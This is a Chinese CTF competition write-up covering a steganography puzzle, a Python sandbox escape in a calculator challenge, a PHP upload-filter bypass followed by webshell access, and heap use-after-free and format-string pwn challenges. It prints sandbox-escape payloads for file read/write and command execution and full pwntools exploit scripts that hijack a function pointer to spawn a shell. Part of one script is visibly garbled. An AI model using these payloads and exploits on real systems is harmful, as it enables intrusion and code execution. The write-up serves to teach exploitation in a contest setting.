## **Misc**
#### **0x00 签到**
回复公众号  
#### **0x01 虚幻**
用winhex分离出9张图，按顺序拼：  
通过Stegsolve改变后很像二维码，但扫不出来  
题目提示汉信码  
根据汉信码的特征，反色后手动拼一个：  
在 中识别汉信码，得到flag:  
flag{4ab1507d-d195-4d30-87c0-a0d85a77d953}
## **Web**
#### **0x02 Calc**
roboot.txt  
Traceback (most recent call last):  
File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 1520, in
_execute  
result = self.prepare()  
File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 2266, in
prepare  
raise HTTPError(self._status_code)  
HTTPError: HTTP 404: Not Found
根据 报错信息和题目 初步确定Python沙箱安全  
初步测试 执行1+2+float(1.1)\1+2+int('3.3')\1+2+abs(3.3)  
说明math函数里面可以有字符串
    payload： 1+2+float(str([].__class__.__mro__[-1].__subclasses__()[40]('/flag').read()))
详细知识请参看  
[]. **class**. **mro** [-1]. **subclasses** ()/(). **class**. **mro** [-1].
**subclasses**
()魔术代码，不用import任何模块，但可调用任意模块的方法。一开始并不知道file在40的位置，直接暴力遍历，后面跟上file对应的方法即可。  
其中常见payload
    #读文件
    ().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
    #写文件
    ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
    #执行任意命令
    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").p
python 沙箱逃逸  
得到flag:  
#### **0x03 wafUpload**
提交一个filename数组
    $file[count($file) - 1] 根据数组下标取最后一个元素
    $ext = end($file) 数组里最后一个元素
菜刀连接find flag  
## **Pwn**
#### **0x04 fgo**
根据题目，可以猜测到应该和fastbin有关， 最开始的思路是：  
1） 添加2个servant，并且servant的名字size都为256；  
2） 释放第2个servant，再释放第1个servant，释放掉第1个servant后，会在fd和bk处填充main_arena+48的值；  
3）
而后重新添加1个servant，并且servant的名字size同样为256，那么最后会在最初始添加servant的地方分配到堆，只要控制好输入servant
ability的值，即可保存bk处存储的main_arena+48的值；  
4） 展示第1个servant的信息，将由此得到main_arena的地址，通过leak到的main_arena地址可以计算到system的地址；  
5） 再次删除掉刚添加的servant；  
6）
再添加1个servant，并且将servant的名字size扩大到512，这样就可以覆盖到最开始添加的2个servant的第2个sevant的print_servant_content函数地址，将其替换成system的地址；  
7） 展示第2个servant的信息时，将会执行system函数，但调试发现system的参数不可控；  
后来逆向发现程序中存在一个secret函数地址，此函数内就是执行了system('/bin/bash')，因此实际上根本不需要计算出system的地址，直接在第6步中，将第2个sevant的print_servant_content函数地址覆盖成secret函数地址即可  
exp:
    #!/usr/bin/python
    import pwnlib
    import re
    from pwn import *
    context.log_level = 'debug'
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = remote('106.75.104.139', 26768)
    #p = process('./pwn')
    elf = ELF('./pwn')
    # new 
    def add(size, content):
        p.recvuntil('Your choice:\n')
        p.sendline("1")
        p.recvuntil("the size of servant's name : \n")
        p.sendline(str(size))
        p.recvuntil("ability : \n")
        p.sendline(content)
    def show(index):
        p.recvuntil('Your choice:\n')
        p.sendline("3")
        p.recvuntil('Index :')
        p.sendline(str(index))
        p.recvuntil('\n')
        data = p.recvuntil("\n")
        print data
        addr = data[:4]
        if len(addr)  {}".format(hex(main_arena_addr))
        system_address = main_arena_addr - main_arena_offset - 48 + libc.symbols['system']
        print "[+] Got system address -> {}".format(hex(system_address))
        delete(0)
        add(512, '\x00'*(16*0x10+8-22) + '/bin/sh\x00'+'\x00'*(22-8)+p32(secret_addr))
        #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
        #gdb.attach(proc.pidof(p)[0])
        #show("1")
        #p.sendline("/bin/sh\x00")
        p.interactive()
    if __name__ == '__main__':
        main()
第二种解法：劫持print_servant_content函数  
用同样的方式leak systeam的函数地址，或者通过read在got中的地址leak，然后再次利用UAF从fastbin中malloced 8
byte的chunk，用systeam的地址覆盖chunk
fb指针处的print_servant_content函数地址，用指令';sh;'覆盖bk指针，通过print_servant操作，call systeam  
`(*(void (__cdecl **)(void *))servantlist[index])(servantlist[index]);`  
exp:
    from pwn import *
    p = process('./pwn')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    #p = remote('106.75.104.139', 26768)
    #libc = ELF('./libc.so.6')
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    def add(size, ability):
        p.recvuntil('choice:')
        p.sendline('1')
        p.recvuntil('name :')
        p.sendline(size)
        p.recvuntil('ability :')
        p.send(ability)
    def delete(index):
        p.recvuntil('choice:')
        p.sendline('2')
        p.recvuntil('Index : ')
        p.sendline(index)
    def show(index):
        p.recvuntil('choice:')
        p.sendline('3')
        p.recvuntil('Index :')
        p.sendline(index)
    add('128','AAAAAAAA')
    add('128','BBBBBBBB')
    delete('1')
    delete('0')
    add('128','CCCC')
    show('0')  # show('2')
    p.recvuntil('CCCC')
    arena_addr = u32(p.recv(4))-48
    log.info('arena_addr: '+hex(arena_addr))
    libc_addr = arena_addr - 0x1B2780  # local libc offset
    log.info('libc_addr: '+hex(libc_addr))
    system_addr = libc_addr + libc.symbols['system']
    log.info('system_addr: '+hex(system_addr))
    delete('0')
    add('8',p32(system_addr)+';sh;')
    show('1')
    p.interactive()
#### **0x05 EasyFMT**
看题目应该是格式化字符串漏洞， 所以最开始需要确定具体的可控的参数位置，利用下述脚本即可获得具体的偏移位置：
    #!/usr/bin/python
    from pwn import *
    elf = ELF('./pwn')
    for i in xrange(1,100):
        p = process('./pwn')
        p.recvuntil("Do you know repeater?\n")
        payload = 'AAAA,%' + str(i) + '$x'
        p.sendline(payload)
        try:
            data = p.recv()
            if '41414141' in data:
                print ""
                print "[+] Found it: {}".format(str(i))